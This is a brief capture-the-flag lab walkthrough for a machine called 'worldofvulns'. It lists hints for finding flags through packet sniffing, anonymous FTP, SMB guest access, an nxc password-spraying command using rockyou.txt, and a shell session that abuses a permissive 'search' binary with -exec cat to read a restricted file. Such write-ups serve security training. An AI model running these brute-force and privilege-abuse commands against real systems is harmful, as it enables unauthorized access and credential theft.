# Secret 000
Open WireShark, filter with `ip.src == ` then look on the UDP broadcast. The flag is in the Data

# Secret 001
An FTP port is open for anonymous login

# Secret 002
The flag is in FTP, you will get the flag after a user enumeration. Then use that username as a password. You can use `nxc` to automate this.

# Secret 003
Use `nxc` to enumerate SMB shares, a share named `files` has a read access. Access with `smbclient.py` using guest username with empty password or null authentication.

# Secret 004
In the SMB brute force all enumerate users with `rockyou.txt`. It is recommended to use `nxc` with the following commands
```bash
nxc smb 192.168.138.131 -u users.txt -p ~/Tools/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding
```

# Secret 007
Since the binary file in `/home/sophie` has been turned as `chmod 777` we can view the `secret007.txt` by using the `search` binary.
```bash
daisy@worldofvulns:/home$ ls -la /usr/share/files/secret007.txt
ls -la /usr/share/files/secret007.txt
-r--r----- 1 root priv02 33 Jan  5  2016 /usr/share/files/secret007.txt
daisy@worldofvulns:/home$ cd sophie
cd sophie
daisy@worldofvulns:/home/sophie$ cd commands
cd commands
daisy@worldofvulns:/home/sophie/commands$ ./search /usr/share/files/secret007.txt -exec cat {} +
t -exec cat {} +are/files/secret007.tx 
79B39B03A79037D1808C8ED62F138C5F
daisy@worldofvulns:/home/sophie/commands$ 
```
